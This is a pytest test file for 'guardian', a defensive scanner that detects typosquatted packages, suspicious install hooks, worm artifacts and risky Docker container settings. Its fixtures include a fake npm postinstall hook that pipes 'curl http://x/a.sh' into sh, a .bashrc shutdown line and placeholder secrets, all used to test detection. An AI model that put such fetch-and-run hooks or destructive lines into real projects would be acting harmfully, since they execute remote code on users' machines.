import json
import os
import shutil
import threading
from datetime import UTC, datetime, timedelta
from http.server import ThreadingHTTPServer
from pathlib import Path

import httpx

from guardian import hub, registry
from guardian.models import Severity
from guardian.modules import containers, package_provenance

# --- registry / slopsquatting ------------------------------------------------------

def test_edit_distance_and_typosquat_candidates():
    assert registry.edit_distance("requests", "requests") == 0
    assert registry.edit_distance("reqeusts", "requests") == 2
    assert "requests" in registry.typosquat_candidates("reqeusts", "pypi")
    assert "lodash" in registry.typosquat_candidates("lodahs", "npm")
    assert registry.typosquat_candidates("requests", "pypi") == []       # exact popular name
    assert registry.typosquat_candidates("abc", "pypi") == []            # too short to judge
    assert "numpy" in registry.typosquat_candidates("python-numpy", "pypi")


def test_assess_flags_missing_young_and_hooked_packages():
    r = registry.assess(registry.PackageReport("npm", "lodahs"))
    assert r.verdict == Severity.CRITICAL and "did you mean" in r.issues[0][1]

    r = registry.assess(registry.PackageReport("pypi", "totally-new-thing"))
    assert r.verdict == Severity.HIGH

    r = registry.PackageReport("npm", "fresh-pkg", exists=True, latest="1.0.0", created=datetime.now(UTC) - timedelta(days=3),
                               versions=1, weekly_downloads=12, maintainers=1, install_scripts={"postinstall": "node setup.js"})
    r = registry.assess(r)
    texts = " ".join(t for _, t in r.issues)
    assert r.verdict == Severity.HIGH and "3 day" in texts and "install hooks" in texts and "one version" in texts

    r = registry.assess(registry.PackageReport("pypi", "huggingface-cli", exists=True, created=datetime.now(UTC) - timedelta(days=400), versions=3, weekly_downloads=5000))
    assert r.verdict == Severity.CRITICAL

    ok = registry.assess(registry.PackageReport("pypi", "requests", exists=True, created=datetime.now(UTC) - timedelta(days=4000),
                                                versions=150, weekly_downloads=10_000_000, repository="https://github.com/psf/requests"))
    assert ok.issues == []


# --- package provenance ----------------------------------------------------------------

def test_package_provenance_scans_projects(ctx, tmp_path, monkeypatch):
    home = tmp_path / "home" / "dev"
    proj = home / "app"
    nm = proj / "node_modules"
    (nm / "lodahs").mkdir(parents=True)
    (nm / "lodahs" / "package.json").write_text(json.dumps({"name": "lodahs", "version": "1.0.0"}))
    (nm / "evil").mkdir()
    (nm / "evil" / "package.json").write_text(json.dumps({"name": "evil", "scripts": {"postinstall": "curl http://x/a.sh | sh"}}))
    (nm / "evil" / "setup_bun.js").write_text("x")
    (nm / "fine").mkdir()
    (nm / "fine" / "package.json").write_text(json.dumps({"name": "fine", "scripts": {"postinstall": "node-gyp rebuild"}}))
    (proj / "package.json").write_text("{}")
    sp = home / ".venv" / "lib" / "python3.15" / "site-packages"
    (sp / "huggingface_cli-1.0.dist-info").mkdir(parents=True)
    (sp / "reqeusts-2.0.dist-info").mkdir()
    (sp / "requests-2.32.0.dist-info").mkdir()
    (home / ".bashrc").write_text("export PATH=$PATH\nsudo shutdown -h now\n")

    monkeypatch.setattr(package_provenance, "_homes_and_roots", lambda extra: [home])
    monkeypatch.setattr(package_provenance, "have", lambda c: False)
    findings = package_provenance.run(ctx)
    checks = {(f.check, f.evidence.get("package") or f.evidence.get("path", "")) for f in findings}

    assert ("possible-typosquat", "lodahs") in checks
    assert ("suspicious-install-hook", "evil") in checks
    assert any(c == "worm-artifact" and "setup_bun.js" in p for c, p in checks)
    assert not any(p == "fine" for _, p in checks)
    assert ("known-slopsquat", "huggingface_cli") in checks
    assert ("possible-typosquat", "reqeusts") in checks
    assert not any(p == "requests" for _, p in checks)
    assert any(c == "rc-wiper-line" for c, _ in checks)
    assert any(c == "no-lockfile" for c, _ in checks)
    # The loader file is found both by the home-directory sweep and by the
    # node_modules scan; it must be reported once, with its worm family.
    bun = [f for f in findings if f.check == "worm-artifact" and f.evidence["path"].endswith("setup_bun.js")]
    assert len(bun) == 1 and bun[0].evidence["family"] == "Shai-Hulud 2.0 loader"


# --- containers -----------------------------------------------------------------------

def test_container_analysis():
    c = {
        "Name": "/api", "Id": "abc", "Config": {"Image": "myapp:latest", "Env": ["OPENAI_API_KEY=sk-proj-" + "A" * 48, "DEBUG=1"], "User": ""},
        "HostConfig": {"Privileged": True, "Binds": ["/var/run/docker.sock:/var/run/docker.sock", "/data:/data"], "NetworkMode": "host",
                       "PidMode": "", "CapAdd": ["SYS_ADMIN"]},
        "Mounts": [],
    }
    findings = containers.analyze_container(c)
    checks = {f.check: f.severity for f in findings}
    assert checks["secret-in-container-env"] == Severity.CRITICAL
    assert checks["privileged-container"] == Severity.HIGH
    assert checks["sensitive-host-mount"] == Severity.CRITICAL
    assert checks["host-namespace"] == Severity.MEDIUM
    assert checks["dangerous-capability"] == Severity.HIGH
    assert "container-runs-as-root" in checks and "unpinned-image" in checks
    assert not any("A" * 12 in (f.title + f.detail) for f in findings)  # masked

    img = {"Id": "sha256:1234567890abcdef", "RepoTags": ["myapp:1.2"], "Config": {"Env": ["HF_TOKEN=hf_" + "b" * 34]}}
    hist = "/bin/sh -c #(nop) ARG AWS_SECRET_ACCESS_KEY=" + "C" * 40 + "\n/bin/sh -c apt-get update"
    f2 = containers.analyze_image(img, hist)
    assert {f.check for f in f2} == {"secret-in-image-env", "secret-in-image-history"}


def test_containers_run_through_stub_docker_cli(ctx, tmp_path, monkeypatch):
    """Drive run() end to end with the fake `docker` the Linux harness plants on PATH."""
    stub = Path(__file__).parent / "linux" / "fake_docker.sh"
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    shutil.copy(stub, bin_dir / "docker")
    (bin_dir / "docker").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ['PATH']}")

    findings = containers.run(ctx)
    by_check = {(f.check, f.evidence.get("container") or f.evidence.get("image")): f for f in findings}
    assert by_check[("secret-in-container-env", "api")].severity == Severity.CRITICAL
    assert by_check[("sensitive-host-mount", "api")].severity == Severity.CRITICAL
    assert by_check[("privileged-container", "api")].severity == Severity.HIGH
    assert by_check[("secret-in-image-env", "myapp:1.2")].evidence["kind"] == "Hugging Face token"
    assert by_check[("secret-in-image-history", "myapp:1.2")].evidence["kind"] == "AWS secret key"
    # The docker.sock bind appears in both Binds and Mounts; one finding, not two.
    assert sum(1 for f in findings if f.check == "sensitive-host-mount") == 1
    assert not any(f.evidence.get("bind") == "/data:/data" for f in findings)


# --- hub --------------------------------------------------------------------------------

def test_hub_roundtrip(tmp_path):
    db = hub.HubDB(tmp_path / "hub.db")
    token = "t" * 32
    srv = ThreadingHTTPServer(("127.0.0.1", 0), hub.make_handler(db, token))
    port = srv.server_address[1]
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    try:
        report = {"host": "web-1", "time": datetime.now(UTC).isoformat(), "score": 42, "modules": [
            {"module": "exposure", "findings": [{"severity": "critical", "title": "Ollama open", "fix": "bind localhost"},
                                                 {"severity": "low", "title": "x", "fix": ""}]}]}
        url = f"http://127.0.0.1:{port}"
        assert hub.push(url, token, json.dumps(report))
        assert not hub.push(url, "wrong-token-" + "x" * 20, json.dumps(report))
        r = httpx.get(url + "/api/hosts", headers={"Authorization": f"Bearer {token}"})
        assert r.json()[0]["host"] == "web-1" and r.json()[0]["critical"] == 1 and r.json()[0]["score"] == 42
        assert httpx.get(url + "/api/hosts").status_code == 401
        page = httpx.get(url + "/").text
        assert "web-1" in page and "42" in page
        host_page = httpx.get(url + "/host/web-1").text
        assert "Ollama open" in host_page and "CRITICAL" in host_page
        assert httpx.post(url + "/api/report", content=b"not json", headers={"Authorization": f"Bearer {token}"}).status_code == 400
    finally:
        srv.shutdown()
